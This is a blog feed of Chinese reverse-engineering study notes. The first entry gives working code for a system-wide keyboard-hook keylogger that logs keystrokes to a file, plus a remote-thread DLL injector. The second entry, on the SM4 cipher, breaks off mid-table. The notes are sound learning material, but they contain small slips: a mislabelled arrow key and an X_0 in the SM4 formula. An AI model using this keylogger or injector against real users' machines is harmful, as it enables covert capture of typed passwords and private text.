<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>pRism</title>
  
  
  <link href="https://www.pri87.vip/atom.xml" rel="self"/>
  
  <link href="https://www.pri87.vip/"/>
  <updated>2024-06-17T16:20:30.400Z</updated>
  <id>https://www.pri87.vip/</id>
  
  <author>
    <name>pRism</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>《逆核》07-键盘hook和DLL注入</title>
    <link href="https://www.pri87.vip/posts/8535f1d8.html"/>
    <id>https://www.pri87.vip/posts/8535f1d8.html</id>
    <published>2024-06-10T12:07:34.000Z</published>
    <updated>2024-06-17T16:20:30.400Z</updated>
    
    <content type="html"><![CDATA[<p>之前尝试过对函数的hook，这次参考了《逆向工程核心原理》，尝试使用windows的系统函数在系统层面对message进行hook</p><hr><h2 id="消息"><a href="#消息" class="headerlink" title="消息"></a>消息</h2><p>Windows是以事件驱动来工作的。每当用户执行一个操作，都会让OS把对应的消息发送给相应的应用程序。</p><p>每个消息都是一个结构，其中的message是对应的消息类别，32位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagMsg</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">       HWND    hwnd;       <span class="comment">//接受该消息的窗口句柄</span></span><br><span class="line">       UINT    message;    <span class="comment">//消息常量标识符，也就是我们通常所说的消息号</span></span><br><span class="line">       WPARAM  wParam;     <span class="comment">//32位消息的特定附加信息，确切含义依赖于消息值</span></span><br><span class="line">       LPARAM  lParam;     <span class="comment">//32位消息的特定附加信息，确切含义依赖于消息值</span></span><br><span class="line">       DWORD   time;       <span class="comment">//消息创建时的时间</span></span><br><span class="line">       POINT   pt;         <span class="comment">//消息创建时的鼠标/光标在屏幕坐标系中的位置</span></span><br><span class="line">&#125;MSG;</span><br></pre></td></tr></table></figure><p>标识符：</p><blockquote><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">WM_NULL<span class="comment">---0x0000    空消息。</span></span><br><span class="line"><span class="number">0</span>x0001<span class="comment">----0x0087    主要是窗口消息。</span></span><br><span class="line"><span class="number">0</span>x00A0<span class="comment">----0x00A9    非客户区消息 </span></span><br><span class="line"><span class="number">0</span>x0100<span class="comment">----0x0108    键盘消息</span></span><br><span class="line"><span class="number">0</span>x0111<span class="comment">----0x0126    菜单消息</span></span><br><span class="line"><span class="number">0</span>x0132<span class="comment">----0x0138    颜色控制消息</span></span><br><span class="line"><span class="number">0</span>x0200<span class="comment">----0x020A    鼠标消息</span></span><br><span class="line"><span class="number">0</span>x0211<span class="comment">----0x0213    菜单循环消息</span></span><br><span class="line"><span class="number">0</span>x0220<span class="comment">----0x0230    多文档消息</span></span><br><span class="line"><span class="number">0</span>x03E0<span class="comment">----0x03E8    DDE消息</span></span><br><span class="line"><span class="number">0</span>x0400             WM_USER</span><br><span class="line"><span class="number">0</span>x8000             WM_APP</span><br><span class="line"><span class="number">0</span>x0400<span class="comment">----0x7FFF    应用程序自定义私有消息</span></span><br></pre></td></tr></table></figure></blockquote><p>消息分为：</p><ul><li>窗口消息：对窗口的操作触发窗口消息：创建窗口，移动窗口，单机鼠标</li><li>命令消息：属于窗口消息，处理从一个窗口发送到另一个窗口的用户请求，比如按下按钮</li><li>控件通知消息：用于子窗口通知父窗口</li></ul><p>每一个程序在执行后，都存在一个消息队列，进程通过第一次调用GDI函数创建一个队列。所有消息都存放在这个队列中，应用程序通过一个消息循环，读取其中的消息并响应。消息队列分为系统消息队列和线程消息队列，系统消息队列由Windows维护，线程消息队列由GUI线程维护。</p><p>以鼠标点击举例：</p><p>当鼠标点击时，驱动创建对应的消息传送到系统消息队列。当有应用要读取时，系统从系统队列中把对应的消息取出，传给对应的线程消息队列。线程在消息的读取循环中把消息拿出来，通过操作系统发送到对应窗口过程处理。</p><hr><h2 id="hook"><a href="#hook" class="headerlink" title="hook"></a>hook</h2><p>hook，就是在它们传递过程中插入自己的代码的操作。</p><p>现在用键盘钩子举例</p><p>重要的函数有以下几个：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">SetWindowsHookEx</span>(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);<span class="comment">//创建一个钩子</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">UnhookWindowsHookEx</span>(g_hHook);<span class="comment">//删除一个钩子</span></span><br></pre></td></tr></table></figure><p>我们要调用这个api执行钩子操作，可以直接把这个写到exe里面，但是这样就是exe监听其它的，而不是直接把dll放进去，所以把这两个函数写到dll里面并添加dllexport关键字作为导出函数，这样就可以被其它进程访问，我们可以专门写一个exe去执行它</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">__declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">HookStart</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">g_hHook = <span class="built_in">SetWindowsHookExA</span>(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">__declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">HookStop</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (g_hHook)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">UnhookWindowsHookEx</span>(g_hHook);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>然后再写钩子的回调函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">writeToFile</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span>* user_dir = <span class="built_in">getenv</span>(<span class="string">&quot;USERPROFILE&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (user_dir != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="type">char</span> file_path[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">snprintf</span>(file_path, <span class="built_in">sizeof</span>(file_path), <span class="string">&quot;%s\\outputkey.txt&quot;</span>, user_dir);</span><br><span class="line">FILE* fl = <span class="built_in">fopen</span>(file_path, <span class="string">&quot;a+&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fl != <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">fwrite</span>(str, <span class="built_in">sizeof</span>(<span class="type">char</span>), <span class="built_in">strlen</span>(str), fl);</span><br><span class="line"><span class="built_in">fclose</span>(fl);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(<span class="type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line"><span class="type">char</span> ch[<span class="number">15</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">if</span> (((DWORD)lParam &amp; <span class="number">0x80000000</span>) &amp;&amp; (HC_ACTION == nCode)) &#123;</span><br><span class="line"><span class="keyword">switch</span> (wParam) &#123;</span><br><span class="line"><span class="keyword">case</span> VK_RETURN:</span><br><span class="line"><span class="built_in">strcpy</span>(ch, <span class="string">&quot;[ENTER]&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> VK_BACK:</span><br><span class="line"><span class="built_in">strcpy</span>(ch, <span class="string">&quot;[BCAKSPACE]&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> VK_TAB:</span><br><span class="line"><span class="built_in">strcpy</span>(ch, <span class="string">&quot;[TAB]&quot;</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> VK_MENU: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[ALT]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_ESCAPE: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[ESC]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_DELETE: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[DELETE]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_LEFT: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[LEFT]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_UP: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[RIGHT]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_RIGHT: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[RIGHT]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_DOWN: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[DOWN]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_LWIN: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[WIN KEY]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_RWIN: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[WIN KEY]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_LCONTROL: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[CTRL]&quot;</span>);  <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_RCONTROL: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[CTRL]&quot;</span>);  <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F1: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F1]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F2: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F2]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F3: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F3]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F4: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F4]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F5: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F5]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F6: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F6]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F7: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F7]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F8: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F8]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F9: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F9]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F10: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F10]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F11: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F11]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">case</span> VK_F12: &#123; <span class="built_in">strcpy</span>(ch, <span class="string">&quot;[F12]&quot;</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">BYTE ks[<span class="number">256</span>];</span><br><span class="line"><span class="built_in">GetKeyboardState</span>(ks);</span><br><span class="line">WORD w;</span><br><span class="line">UINT scan = <span class="number">0</span>;</span><br><span class="line"><span class="built_in">ToAscii</span>(wParam, scan, ks, &amp;w, <span class="number">0</span>);</span><br><span class="line">ch[<span class="number">0</span>] = <span class="built_in">char</span>(w);</span><br><span class="line">ch[<span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">writeToFile</span>(ch);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">CallNextHookEx</span>(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时dllmain就可以什么都不干了，只用找到当前进程句柄就好</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">HMODULE hinstDLL,</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD  dwReason,</span></span></span><br><span class="line"><span class="params"><span class="function">LPVOID lParam</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (dwReason)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">g_hInstance = hinstDLL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_ATTACH:</span><br><span class="line"><span class="keyword">case</span> DLL_THREAD_DETACH:</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就可以在固定位置生成文件写入按键了，上面的代码参考了github上的一个项目</p><hr><h2 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h2><p>从外部促使目标进程调用LoadLibrary的API使得执行DLLMain</p><p>书上只写了两种方法，之后有机会试一试反射注入，听说效果更好</p><p>第一种：</p><p>远程线程注入，创建一个远程线程代替原本进程注入进去，</p><p>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">WINBASEAPI</span></span><br><span class="line"><span class="function">_Ret_maybenull_</span></span><br><span class="line"><span class="function">HANDLE</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">CreateRemoteThread</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T dwStackSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPTHREAD_START_ROUTINE lpStartAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPVOID lpParameter,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD dwCreationFlags,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ LPDWORD lpThreadId</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>其中第4个参数（如果没有第二个可选参数就是第三个）是线程回调函数地址，当创建好线程后，这个线程就会执行这个函数。其最终的传入参数是CreateRemoteThread的第5个参数，这里它一定是一个指针，所以如果要传入多个参数的话需要一些数据结构，比如数组指针或者结构体指针。</p><p>由于传入参数是一个指针，而一个进程只能访问它拥有的内存空间，所以为了把dll成功注入，需要先把参数写到目标进程的内存中</p><p>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WINBASEAPI</span><br><span class="line">_Ret_maybenull_</span><br><span class="line">_Post_writable_byte_size_(dwSize)</span><br><span class="line"><span class="function">LPVOID</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">VirtualAllocEx</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_opt_ LPVOID lpAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T dwSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD flAllocationType,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ DWORD flProtect</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>是用于在目标进程内申请空间并返回对应指针的函数</p><p>函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">WINBASEAPI</span><br><span class="line">_Success_(<span class="keyword">return</span> != FALSE)</span><br><span class="line"><span class="function">BOOL</span></span><br><span class="line"><span class="function">WINAPI</span></span><br><span class="line"><span class="function"><span class="title">WriteProcessMemory</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ HANDLE hProcess,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ LPVOID lpBaseAddress,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_reads_bytes_(nSize) LPCVOID lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">    _In_ SIZE_T nSize,</span></span></span><br><span class="line"><span class="params"><span class="function">    _Out_opt_ SIZE_T* lpNumberOfBytesWritten</span></span></span><br><span class="line"><span class="params"><span class="function">    )</span></span>;</span><br></pre></td></tr></table></figure><p>这个是写入内存的函数，第二个参数是之前申请到的地址，第三个参数是写入的内容。</p><p>然后就可以直接用第二个参数当写入内容的指针了</p><p>inject函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">inject</span><span class="params">(DWORD dwPID, LPCTSTR szDllPath)</span> </span>&#123;</span><br><span class="line">HANDLE hProcess = <span class="number">0</span>, hThread = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!(hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, dwPID)))<span class="comment">//取得对应PID句柄</span></span><br><span class="line">&#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;open %d failed\n&quot;</span>), dwPID);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + <span class="number">1</span>) * <span class="built_in">sizeof</span>(TCHAR);</span><br><span class="line">LPVOID pBuf = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwBufSize, MEM_COMMIT, PAGE_READWRITE);<span class="comment">//申请内存</span></span><br><span class="line"><span class="keyword">if</span> (pBuf == <span class="number">0</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;memory alloc failed\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pBuf, (LPVOID)szDllPath, dwBufSize, <span class="literal">NULL</span>);<span class="comment">//写入地址</span></span><br><span class="line">HMODULE kernel = <span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (kernel == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">LPTHREAD_START_ROUTINE pThreadProc = (LPTHREAD_START_ROUTINE)<span class="built_in">GetProcAddress</span>(kernel, <span class="string">&quot;LoadLibraryW&quot;</span>);<span class="comment">//获取LodaLibrary地址</span></span><br><span class="line">hThread = <span class="built_in">CreateRemoteThread</span>(hProcess,</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">pThreadProc,<span class="comment">//线程回调函数</span></span><br><span class="line">pBuf,<span class="comment">//传参</span></span><br><span class="line"><span class="number">0</span>,</span><br><span class="line"><span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">_tprintf(_T(<span class="string">&quot;create hThread failed\n&quot;</span>));</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);<span class="comment">//等待线程结束</span></span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在测试中，得知了x86的进程，那么注入器和dll也要是x86的，x64的也一样</p><p>还没学DLL卸载QAQ</p>]]></content>
    
    
    <summary type="html">好久没有更新了，现在更新一波</summary>
    
    
    
    <category term="逆向工程核心原理" scheme="https://www.pri87.vip/categories/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="逆向" scheme="https://www.pri87.vip/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="学习" scheme="https://www.pri87.vip/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="windows" scheme="https://www.pri87.vip/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>加密04-SM4</title>
    <link href="https://www.pri87.vip/posts/77e5000d.html"/>
    <id>https://www.pri87.vip/posts/77e5000d.html</id>
    <published>2024-06-05T03:22:04.000Z</published>
    <updated>2024-06-17T16:20:30.399Z</updated>
    
    <content type="html"><![CDATA[<p>好耶，不用介绍了，</p><p><a href="http://www.gmbz.org.cn/main/viewfile/20180108015408199368.html">文档连接</a></p><p>感觉和AES加密差不多</p><h1 id="SM4-SMS4"><a href="#SM4-SMS4" class="headerlink" title="SM4&#x2F;SMS4"></a>SM4&#x2F;SMS4</h1><h2 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h2><p>分组算法，分组长度位128位，密钥长度位128位</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><h3 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h3><p>32次迭代</p><p>输入为X0到X4共十六字节，每个X有4字节，通过轮密钥运算生成X0对应的X5……以此类推，直到生成了X32,X33,X34,X35</p><p>具体来说<br>$$<br>X_{i+4}&#x3D;F(X_i,X_{i+1},X_{i+2},X_{i+3},rk_i)<br>$$</p><p>其中F为轮函数：<br>$$<br>F(X_i,X_{i+1},X_{i+2},X_{i+3},rk_i) &#x3D; X_0\oplus T(X_{i+1}\oplus X_{i+2}\oplus X_{i+3}\oplus rk_i)<br>$$</p><p>其中T为合成置换，$T(x) &#x3D; L(\tau)$，其中L是线性变换，$\tau$是非线性变换</p><p>对于$\tau$,</p><p>把输入的四个值转为hex，查S盒，得到下一个值</p><p><img src="https://s2.loli.net/2024/06/05/ZCGLwJEIuyHD5VO.png" alt="image-20240605162119411"></p><p>得到转化后的4个值记为B</p><p>结果C&#x3D;<br>$$<br>L(B)&#x3D;B\oplus(B&lt;&lt;&lt;2)\oplus(B&lt;&lt;&lt;10)\oplus(B&lt;&lt;&lt;18)\oplus(B&lt;&lt;&lt;24)<br>$$<br>&lt;&lt;&lt;是32位循环左移</p><p>1次反序变换</p><p>将结果变为X35,X34,X33,X32</p><h3 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h3><p>FK系统参数  CK固定参数 MK输入密钥一共4个</p><p>轮密钥由加密密钥生成</p><p>加密密钥K0到K3由$MK_i$和$FK_i$异或得到</p><p>后面的则是$rK_i$&#x3D;<br>$$<br>K_{I+4}&#x3D;K_i \oplus T’(K_{i+1} \oplus K_{i+2} \oplus K_{i+3}\oplus CK_i)<br>$$<br>T’是将T的线性变换L换成下面的L‘：<br>$$<br>L’(B)&#x3D;B\oplus(B&lt;&lt;&lt;13)\oplus(B&lt;&lt;&lt;23)<br>$$</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">FK0</span> <span class="operator">=</span> A3B1BAC6</span><br><span class="line"><span class="attribute">FK1</span> <span class="operator">=</span> <span class="number">56</span>AA3350</span><br><span class="line"><span class="attribute">FK2</span> <span class="operator">=</span> <span 